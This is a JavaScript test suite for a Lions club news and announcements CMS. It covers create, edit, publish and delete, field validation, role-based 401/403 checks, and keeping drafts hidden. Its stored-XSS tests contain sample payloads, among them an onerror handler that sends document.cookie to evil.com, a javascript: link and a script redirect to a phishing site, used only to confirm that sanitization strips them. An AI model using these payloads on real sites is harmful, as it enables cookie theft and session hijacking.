/**
 * tests/news-cms.test.mjs
 * Test Suite for News & Announcements Management (CMS CRUD)
 *
 * Story: As a club administrator, I want to create, edit, publish, unpublish,
 * and delete news and announcements so that the public site stays current.
 *
 * Acceptance Criteria Covered:
 *   - AC1: Authorised users can create, view, update, publish, unpublish and delete news/announcements
 *   - AC2: Server-side validation with clear field errors (title, type, body, expireDate)
 *   - AC3: Delete needs confirmation; unauthorised calls rejected (401 / 403)
 *   - AC4: Unpublished/draft items are strictly NOT visible publicly
 *   - AC5: Body content stored and rendered safely (no stored XSS)
 *   - AC6: Success/failure feedback, persistence, and confirmation patterns
 */

import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';

import { createTestDatabase } from '../src/lib/db.ts';
import { hashPassword } from '../src/lib/auth/password.ts';
import {
  createSessionToken,
  setAuthDatabase,
} from '../src/lib/auth/session.ts';
import {
  createNews,
  getNewsById,
  getAllNewsForAdmin,
  updateNews,
  deleteNews,
  getPublishedNewsFromDb,
  getPublishedNewsBySlugFromDb,
  setNewsDatabase,
} from '../src/lib/news-repository.ts';
import {
  validateNewsCreateInput,
  validateNewsUpdateInput,
} from '../src/lib/news-validation.ts';
import { sanitizeNewsContent } from '../src/lib/news.ts';

// Route handlers for integration verification
import {
  GET as adminNewsGetRoute,
  POST as adminNewsPostRoute,
} from '../src/app/api/admin/news/route.ts';
import {
  GET as adminNewsByIdRoute,
  PUT as adminNewsUpdateRoute,
  DELETE as adminNewsDeleteRoute,
} from '../src/app/api/admin/news/[id]/route.ts';
import { GET as publicNewsRoute } from '../src/app/api/news/route.ts';
import { GET as publicNewsBySlugRoute } from '../src/app/api/news/[slug]/route.ts';

describe('News & Announcements CMS Management Test Suite', () => {
  let testDb;
  let adminUser;
  let editorUser;
  let adminToken;
  let editorToken;

  before(async () => {
    testDb = createTestDatabase();

    const adminHash = await hashPassword('AdminPass2026!', 10);
    const editorHash = await hashPassword('EditorPass2026!', 10);

    const insertUser = testDb.prepare(`
      INSERT INTO users (user_id, username, email, password_hash, full_name, role, is_active)
      VALUES (?, ?, ?, ?, ?, ?, ?)
    `);

    insertUser.run(
      'usr-admin-cms',
      'cms_admin',
      'cms_admin@balangodalions.org',
      adminHash,
      'Lion Admin User',
      'ADMIN',
      1
    );

    insertUser.run(
      'usr-editor-cms',
      'cms_editor',
      'cms_editor@balangodalions.org',
      editorHash,
      'Lion Editor User',
      'EDITOR',
      1
    );

    adminUser = {
      userId: 'usr-admin-cms',
      username: 'cms_admin',
      email: 'cms_admin@balangodalions.org',
      fullName: 'Lion Admin User',
      role: 'ADMIN',
      isActive: true,
    };

    editorUser = {
      userId: 'usr-editor-cms',
      username: 'cms_editor',
      email: 'cms_editor@balangodalions.org',
      fullName: 'Lion Editor User',
      role: 'EDITOR',
      isActive: true,
    };

    adminToken = createSessionToken(adminUser);
    editorToken = createSessionToken(editorUser);

    setAuthDatabase(testDb);
    setNewsDatabase(testDb);
  });

  after(() => {
    setAuthDatabase(null);
    setNewsDatabase(null);
    testDb.close();
  });

  /* =========================================================================
   * AC1: News CRUD & Lifecycle (Create, View, Update, Publish, Unpublish, Delete)
   * ========================================================================= */
  describe('AC1: News CRUD & Full Lifecycle Operations', () => {
    let createdArticleId;

    it('creates a news article in DRAFT status with pinning and auto-unpin date', () => {
      const futureDate = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString();
      const article = createNews(
        {
          title: 'District Governor Annual Official Visit 2026',
          summary: 'Annual inspection and community welfare banquet scheduled for November.',
          content: '<p>District Governor Lion Dr. Gamini will visit Balangoda.</p>',
          newsType: 'ANNOUNCEMENT',
          coverImageUrl: 'https://images.unsplash.com/photo-governor-visit.jpg',
          isPinned: true,
          expireDate: futureDate,
          status: 'DRAFT',
        },
        adminUser.userId,
        testDb
      );

      assert.ok(article.id, 'Article must have generated ID');
      assert.strictEqual(article.title, 'District Governor Annual Official Visit 2026');
      assert.strictEqual(article.newsType, 'ANNOUNCEMENT');
      assert.strictEqual(article.status, 'DRAFT');
      assert.strictEqual(article.isPinned, true);
      assert.strictEqual(article.expireDate, futureDate);
      assert.strictEqual(article.publishedAt, null, 'Draft must have null publishedAt');

      createdArticleId = article.id;
    });

    it('retrieves news by ID for administrative inspection (SCR-10)', async () => {
      const item = getNewsById(createdArticleId, testDb);
      assert.ok(item, 'Article must be retrievable by ID');
      assert.strictEqual(item.id, createdArticleId);
      assert.strictEqual(item.title, 'District Governor Annual Official Visit 2026');
      assert.strictEqual(item.isPinned, true);

      // Verify GET /api/admin/news/[id] route handler
      const req = new Request(`http://localhost:3000/api/admin/news/${createdArticleId}`, {
        headers: { Cookie: `lions_session_token=${editorToken}` },
      });
      const res = await adminNewsByIdRoute(req, {
        params: Promise.resolve({ id: createdArticleId }),
      });
      assert.strictEqual(res.status, 200);
      const json = await res.json();
      assert.strictEqual(json.data.id, createdArticleId);

      // Verify getAllNewsForAdmin includes the item
      const adminList = getAllNewsForAdmin({ query: 'Governor' }, testDb);
      assert.ok(adminList.length > 0);
      assert.strictEqual(adminList[0].id, createdArticleId);
    });

    it('updates article text, type, and cover image (SCR-09)', () => {
      const updated = updateNews(
        createdArticleId,
        {
          title: 'District Governor Official Visit 2026 - Confirmed Dates',
          newsType: 'NEWS',
          summary: 'Updated banquet timetable and awards schedule.',
          content: '<p>Updated itinerary for District Governor official tour.</p>',
        },
        testDb
      );

      assert.ok(updated);
      assert.strictEqual(updated.title, 'District Governor Official Visit 2026 - Confirmed Dates');
      assert.strictEqual(updated.newsType, 'NEWS');
      assert.strictEqual(updated.summary, 'Updated banquet timetable and awards schedule.');
    });

    it('publishes the article (status transitions to PUBLISHED and sets publishedAt)', () => {
      const published = updateNews(
        createdArticleId,
        { status: 'PUBLISHED' },
        testDb
      );

      assert.ok(published);
      assert.strictEqual(published.status, 'PUBLISHED');
      assert.ok(published.publishedAt, 'Published article must have a publishedAt timestamp');
    });

    it('unpublishes the article (status transitions back to DRAFT for SCR-20)', () => {
      const unpublished = updateNews(
        createdArticleId,
        { status: 'DRAFT' },
        testDb
      );

      assert.ok(unpublished);
      assert.strictEqual(unpublished.status, 'DRAFT');
    });

    it('allows ADMIN to permanently delete the news article (SCR-19)', () => {
      const result = deleteNews(createdArticleId, testDb);
      assert.strictEqual(result, true, 'Delete operation must return true');

      const lookup = getNewsById(createdArticleId, testDb);
      assert.strictEqual(lookup, null, 'Article must no longer exist in the database');
    });
  });

  /* =========================================================================
   * AC2: Server-Side Validation with Clear Field Errors
   * ========================================================================= */
  describe('AC2: Server-Side Field Validation (Clear Errors on Malformed Inputs)', () => {
    it('validates a compliant payload successfully', () => {
      const result = validateNewsCreateInput({
        title: 'Free Cataract Eye Screening Camp 2026',
        newsType: 'NEWS',
        content: '<p>Full screening details and venue directions.</p>',
        summary: 'Over 200 free screenings available.',
        isPinned: false,
        status: 'PUBLISHED',
      });

      assert.strictEqual(result.isValid, true);
      assert.deepStrictEqual(result.errors, {});
      assert.strictEqual(result.sanitizedData.title, 'Free Cataract Eye Screening Camp 2026');
      assert.strictEqual(result.sanitizedData.status, 'PUBLISHED');
    });

    it('validates partial update inputs correctly', () => {
      const validUpdate = validateNewsUpdateInput({
        title: 'Updated Headline Over Five Chars',
        isPinned: true,
      });
      assert.strictEqual(validUpdate.isValid, true);
      assert.strictEqual(validUpdate.sanitizedData.title, 'Updated Headline Over Five Chars');
      assert.strictEqual(validUpdate.sanitizedData.isPinned, true);

      const invalidUpdate = validateNewsUpdateInput({
        title: 'Tiny',
      });
      assert.strictEqual(invalidUpdate.isValid, false);
      assert.ok(invalidUpdate.errors.title);
    });

    it('rejects missing or empty title with clear field error', () => {
      const result = validateNewsCreateInput({
        title: '   ',
        newsType: 'NEWS',
        content: '<p>Some content</p>',
      });

      assert.strictEqual(result.isValid, false);
      assert.ok(result.errors.title, 'Must contain error for title field');
      assert.strictEqual(result.errors.title, 'News headline/title is required.');
    });

    it('rejects title shorter than 5 characters', () => {
      const result = validateNewsCreateInput({
        title: 'Camp',
        newsType: 'NEWS',
        content: '<p>Content</p>',
      });

      assert.strictEqual(result.isValid, false);
      assert.ok(result.errors.title.includes('at least 5 characters'));
    });

    it('rejects title exceeding 200 characters', () => {
      const result = validateNewsCreateInput({
        title: 'A'.repeat(201),
        newsType: 'NEWS',
        content: '<p>Content</p>',
      });

      assert.strictEqual(result.isValid, false);
      assert.ok(result.errors.title.includes('not exceed 200 characters'));
    });

    it('rejects invalid news type', () => {
      const result = validateNewsCreateInput({
        title: 'Valid News Title Here',
        newsType: 'INVALID_CATEGORY',
        content: '<p>Valid content body</p>',
      });

      assert.strictEqual(result.isValid, false);
      assert.ok(result.errors.newsType);
      assert.ok(result.errors.newsType.includes('Allowed types: NEWS, ANNOUNCEMENT, PRESS_RELEASE'));
    });

    it('rejects empty or whitespace-only body content', () => {
      const result = validateNewsCreateInput({
        title: 'Valid Title Here',
        newsType: 'NEWS',
        content: '   <p>   </p>   ',
      });

      assert.strictEqual(result.isValid, false);
      assert.ok(result.errors.content);
      assert.strictEqual(result.errors.content, 'Article body content is required.');
    });

    it('rejects past expiration date with clear field error', () => {
      const result = validateNewsCreateInput({
        title: 'Valid Title Here',
        newsType: 'NEWS',
        content: '<p>Some body</p>',
        expireDate: '2020-01-01',
      });

      assert.strictEqual(result.isValid, false);
      assert.ok(result.errors.expireDate);
      assert.ok(result.errors.expireDate.includes('future date'));
    });

    it('rejects summary exceeding 500 characters', () => {
      const result = validateNewsCreateInput({
        title: 'Valid Title Here',
        newsType: 'NEWS',
        content: '<p>Some body</p>',
        summary: 'X'.repeat(501),
      });

      assert.strictEqual(result.isValid, false);
      assert.ok(result.errors.summary);
      assert.ok(result.errors.summary.includes('500 characters'));
    });

    it('API route POST /api/admin/news returns HTTP 400 with structured field errors on invalid payload', async () => {
      const req = new Request('http://localhost:3000/api/admin/news', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Cookie: `lbw_session=${editorToken}`,
        },
        body: JSON.stringify({
          title: 'Hey', // too short
          newsType: 'BOGUS_TYPE', // invalid
          content: '', // missing
        }),
      });

      const res = await adminNewsPostRoute(req);
      assert.strictEqual(res.status, 400);

      const json = await res.json();
      assert.strictEqual(json.success, false);
      assert.ok(json.errors);
      assert.ok(json.errors.title);
      assert.ok(json.errors.newsType);
      assert.ok(json.errors.content);
    });

    it('API route PUT /api/admin/news/[id] returns HTTP 400 on invalid update fields', async () => {
      const testItem = createNews(
        {
          title: 'Temporary Test Article For Update',
          content: '<p>Temporary content</p>',
          newsType: 'NEWS',
        },
        adminUser.userId,
        testDb
      );

      const req = new Request(`http://localhost:3000/api/admin/news/${testItem.id}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          Cookie: `lbw_session=${editorToken}`,
        },
        body: JSON.stringify({
          expireDate: '2019-12-31', // past date
        }),
      });

      const res = await adminNewsUpdateRoute(req, { params: Promise.resolve({ id: testItem.id }) });
      assert.strictEqual(res.status, 400);

      const json = await res.json();
      assert.strictEqual(json.success, false);
      assert.ok(json.errors.expireDate);

      // Clean up
      deleteNews(testItem.id, testDb);
    });
  });

  /* =========================================================================
   * AC3: Authorization & Role Enforcement (401 / 403 / Admin Deletion)
   * ========================================================================= */
  describe('AC3: Authorization & Role Enforcement', () => {
    let testArticleId;

    before(() => {
      const item = createNews(
        {
          title: 'Role Enforcement Testing Article',
          content: '<p>Role testing content</p>',
          newsType: 'NEWS',
          status: 'DRAFT',
        },
        adminUser.userId,
        testDb
      );
      testArticleId = item.id;
    });

    after(() => {
      deleteNews(testArticleId, testDb);
    });

    it('rejects unauthenticated GET /api/admin/news with 401 Unauthorized', async () => {
      const req = new Request('http://localhost:3000/api/admin/news');
      const res = await adminNewsGetRoute(req);
      assert.strictEqual(res.status, 401);
    });

    it('rejects unauthenticated POST /api/admin/news with 401 Unauthorized', async () => {
      const req = new Request('http://localhost:3000/api/admin/news', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ title: 'Unauthenticated Article' }),
      });
      const res = await adminNewsPostRoute(req);
      assert.strictEqual(res.status, 401);
    });

    it('rejects EDITOR attempting DELETE /api/admin/news/[id] with 403 Forbidden', async () => {
      const req = new Request(`http://localhost:3000/api/admin/news/${testArticleId}`, {
        method: 'DELETE',
        headers: {
          Cookie: `lbw_session=${editorToken}`,
        },
      });

      const res = await adminNewsDeleteRoute(req, { params: Promise.resolve({ id: testArticleId }) });
      assert.strictEqual(res.status, 403, 'EDITOR must receive 403 Forbidden when deleting news');

      // Verify article was NOT deleted
      const stillExists = getNewsById(testArticleId, testDb);
      assert.ok(stillExists, 'Article must still exist in database after rejected deletion');
    });

    it('allows ADMIN to delete news article returning 200 OK', async () => {
      const deleteArticle = createNews(
        {
          title: 'Article To Be Deleted By Admin',
          content: '<p>Content</p>',
          newsType: 'NEWS',
        },
        adminUser.userId,
        testDb
      );

      const req = new Request(`http://localhost:3000/api/admin/news/${deleteArticle.id}`, {
        method: 'DELETE',
        headers: {
          Cookie: `lbw_session=${adminToken}`,
        },
      });

      const res = await adminNewsDeleteRoute(req, { params: Promise.resolve({ id: deleteArticle.id }) });
      assert.strictEqual(res.status, 200);

      const json = await res.json();
      assert.strictEqual(json.success, true);
      assert.strictEqual(getNewsById(deleteArticle.id, testDb), null);
    });
  });

  /* =========================================================================
   * AC4: Public Invisibility of Unpublished / Draft Items
   * ========================================================================= */
  describe('AC4: Public Visibility Boundary (DRAFT & ARCHIVED Strictly Hidden)', () => {
    let draftArticle;
    let publishedArticle;

    before(() => {
      draftArticle = createNews(
        {
          title: 'Confidential Internal Club Meeting Notice',
          summary: 'Internal committee discussion points.',
          content: '<p>Secret internal strategy notes.</p>',
          newsType: 'ANNOUNCEMENT',
          status: 'DRAFT',
        },
        adminUser.userId,
        testDb
      );

      publishedArticle = createNews(
        {
          title: 'Public Medical Clinic 2026 Announcement',
          summary: 'Community medical clinic dates.',
          content: '<p>Free medical checkups for all citizens.</p>',
          newsType: 'NEWS',
          status: 'PUBLISHED',
        },
        adminUser.userId,
        testDb
      );
    });

    after(() => {
      deleteNews(draftArticle.id, testDb);
      deleteNews(publishedArticle.id, testDb);
    });

    it('public news feed includes PUBLISHED article and strictly excludes DRAFT article', async () => {
      // Direct repository boundary verification
      const pubRepoList = getPublishedNewsFromDb({}, testDb);
      const inPubRepo = pubRepoList.some((n) => n.id === publishedArticle.id);
      const draftInPubRepo = pubRepoList.some((n) => n.id === draftArticle.id);
      assert.strictEqual(inPubRepo, true, 'Published news must be returned by repository');
      assert.strictEqual(draftInPubRepo, false, 'Draft news must NEVER be returned by repository');

      // Slug lookup boundary verification
      const draftSlugLookup = getPublishedNewsBySlugFromDb(draftArticle.slug, testDb);
      assert.strictEqual(draftSlugLookup, null, 'Repository must return null for draft slug');

      const req = new Request('http://localhost:3000/api/news');
      const res = await publicNewsRoute(req);
      assert.strictEqual(res.status, 200);

      const json = await res.json();
      assert.strictEqual(json.success, true);

      const foundPublished = json.data.find((item) => item.id === publishedArticle.id);
      const foundDraft = json.data.find((item) => item.id === draftArticle.id);

      assert.ok(foundPublished, 'Published article must be in public list');
      assert.strictEqual(foundDraft, undefined, 'Draft article must NEVER be exposed in public list');
    });

    it('public detail query for DRAFT slug returns 404 Not Found', async () => {
      const req = new Request(`http://localhost:3000/api/news/${draftArticle.slug}`);
      const res = await publicNewsBySlugRoute(req, {
        params: Promise.resolve({ slug: draftArticle.slug }),
      });

      assert.strictEqual(res.status, 404, 'DRAFT news slug must return 404 on public route');
    });

    it('unpublishing article makes it immediately inaccessible to public', async () => {
      // 1. Initially published and visible
      const reqBefore = new Request(`http://localhost:3000/api/news/${publishedArticle.slug}`);
      const resBefore = await publicNewsBySlugRoute(reqBefore, {
        params: Promise.resolve({ slug: publishedArticle.slug }),
      });
      assert.strictEqual(resBefore.status, 200);

      // 2. Unpublish to DRAFT
      updateNews(publishedArticle.id, { status: 'DRAFT' }, testDb);

      // 3. Immediately returns 404 to public
      const reqAfter = new Request(`http://localhost:3000/api/news/${publishedArticle.slug}`);
      const resAfter = await publicNewsBySlugRoute(reqAfter, {
        params: Promise.resolve({ slug: publishedArticle.slug }),
      });
      assert.strictEqual(resAfter.status, 404, 'Unpublished item must immediately return 404 to public');

      // Restore for cleanup
      updateNews(publishedArticle.id, { status: 'PUBLISHED' }, testDb);
    });
  });

  /* =========================================================================
   * AC5: Stored XSS Defense (Body Content Sanitization)
   * ========================================================================= */
  describe('AC5: Stored XSS Defense in News Body Content', () => {
    it('strips <script> tags and malicious inline code from article content', () => {
      const maliciousHtml = `
        <p>Welcome to our community update.</p>
        <script>alert("XSS Vulnerability Executed!");</script>
        <p>Event details continue here.</p>
      `;

      const sanitized = sanitizeNewsContent(maliciousHtml);
      assert.strictEqual(sanitized.includes('<script>'), false);
      assert.strictEqual(sanitized.includes('alert('), false);
      assert.ok(sanitized.includes('<p>Welcome to our community update.</p>'));
      assert.ok(sanitized.includes('<p>Event details continue here.</p>'));
    });

    it('disarms onerror and onload attributes on image and media elements', () => {
      const vector = '<img src="missing.jpg" onerror="fetch(\'http://evil.com/cookie?c=\' + document.cookie)" /><svg onload=alert(1)>';
      const sanitized = sanitizeNewsContent(vector);

      assert.strictEqual(sanitized.includes('onerror='), false);
      assert.strictEqual(sanitized.includes('onload='), false);
      assert.strictEqual(sanitized.includes('evil.com'), false);
    });

    it('disarms javascript: pseudoprotocol URLs in hyperlinks', () => {
      const linkVector = '<a href="javascript:alert(\'pwned\')">Click to register for medical camp</a>';
      const sanitized = sanitizeNewsContent(linkVector);

      assert.strictEqual(sanitized.includes('javascript:'), false);
      assert.ok(sanitized.includes('href="#"'));
      assert.ok(sanitized.includes('Click to register for medical camp'));
    });

    it('strips embedded iframes and dangerous active objects', () => {
      const iframeVector = '<p>Legit article</p><iframe src="http://malicious-site.example/login"></iframe>';
      const sanitized = sanitizeNewsContent(iframeVector);

      assert.strictEqual(sanitized.includes('<iframe'), false);
      assert.ok(sanitized.includes('<p>Legit article</p>'));
    });

    it('stores sanitized content in SQLite database when created via API', async () => {
      const xssPayload = '<p>Community Notice</p><script>window.location="http://phishing.site"</script>';

      const req = new Request('http://localhost:3000/api/admin/news', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Cookie: `lbw_session=${editorToken}`,
        },
        body: JSON.stringify({
          title: 'XSS Defense Verification Article',
          content: xssPayload,
          newsType: 'NEWS',
          status: 'DRAFT',
        }),
      });

      const res = await adminNewsPostRoute(req);
      assert.strictEqual(res.status, 201);

      const json = await res.json();
      assert.ok(json.data.id);

      // Verify raw database record contains NO script tag
      const rawRow = testDb
        .prepare('SELECT content FROM news_announcements WHERE news_id = ?')
        .get(json.data.id);

      assert.ok(rawRow);
      assert.strictEqual(rawRow.content.includes('<script>'), false);
      assert.strictEqual(rawRow.content.includes('phishing.site'), false);

      // Clean up
      deleteNews(json.data.id, testDb);
    });
  });

  /* =========================================================================
   * AC6: CMS Admin UI Verification (Components, Screens, Modals)
   * ========================================================================= */
  describe('AC6: CMS Admin UI Verification (Screens & Modals)', () => {
    it('SCR-07: News list screen source exists and includes table, filter tabs, and new article button', () => {
      const listPagePath = path.join(process.cwd(), 'src/app/admin/news/page.tsx');
      assert.ok(fs.existsSync(listPagePath), 'News list page must exist at src/app/admin/news/page.tsx');

      const content = fs.readFileSync(listPagePath, 'utf8');
      assert.ok(content.includes('Club News & Announcements'));
      assert.ok(content.includes('+ New Article'));
      assert.ok(content.includes('data-testid="news-admin-table"'));
      assert.ok(content.includes('handleTogglePin'));
      assert.ok(content.includes('DeleteConfirmModal'));
      assert.ok(content.includes('UnpublishConfirmModal'));
    });

    it('SCR-08: News create screen source exists and includes validation, pin toggle, and publish action', () => {
      const createPagePath = path.join(process.cwd(), 'src/app/admin/news/create/page.tsx');
      assert.ok(fs.existsSync(createPagePath), 'Create page must exist at src/app/admin/news/create/page.tsx');

      const content = fs.readFileSync(createPagePath, 'utf8');
      assert.ok(content.includes('Create New Article or Announcement'));
      assert.ok(content.includes('Publish Now'));
      assert.ok(content.includes('Save as Draft'));
      assert.ok(content.includes('Pin to Top of Homepage'));
      assert.ok(content.includes('Auto-Unpin Date'));
    });

    it('SCR-09: News edit screen source exists and includes unpublish, delete, and save actions', () => {
      const editPagePath = path.join(process.cwd(), 'src/app/admin/news/[id]/edit/page.tsx');
      assert.ok(fs.existsSync(editPagePath), 'Edit page must exist at src/app/admin/news/[id]/edit/page.tsx');

      const content = fs.readFileSync(editPagePath, 'utf8');
      assert.ok(content.includes('Edit News Article'));
      assert.ok(content.includes('Save Changes'));
      assert.ok(content.includes('Unpublish'));
    });

    it('SCR-10: News detail screen source exists and includes metadata, preview, and safe rendering', () => {
      const detailPagePath = path.join(process.cwd(), 'src/app/admin/news/[id]/page.tsx');
      assert.ok(fs.existsSync(detailPagePath), 'Detail page must exist at src/app/admin/news/[id]/page.tsx');

      const content = fs.readFileSync(detailPagePath, 'utf8');
      assert.ok(content.includes('News Details & Preview'));
      assert.ok(content.includes('Edit Article'));
      assert.ok(content.includes('Back to News List'));
      assert.ok(content.includes('dangerouslySetInnerHTML'));
    });

    it('SCR-19 & SCR-20: Confirmation modals exist with explicit consequence explanations', () => {
      const modalsPath = path.join(process.cwd(), 'src/components/admin/NewsModals.tsx');
      assert.ok(fs.existsSync(modalsPath), 'NewsModals must exist at src/components/admin/NewsModals.tsx');

      const content = fs.readFileSync(modalsPath, 'utf8');
      // SCR-19
      assert.ok(content.includes('DeleteConfirmModal'));
      assert.ok(content.includes('Permanently Delete'));
      assert.ok(content.includes('This action cannot be undone'));
      assert.ok(content.includes('Yes, Permanently Delete'));

      // SCR-20
      assert.ok(content.includes('UnpublishConfirmModal'));
      assert.ok(content.includes('Unpublish'));
      assert.ok(content.includes('none of your content will be lost'));
      assert.ok(content.includes('Yes, Unpublish and Move to Drafts'));
    });
  });
});
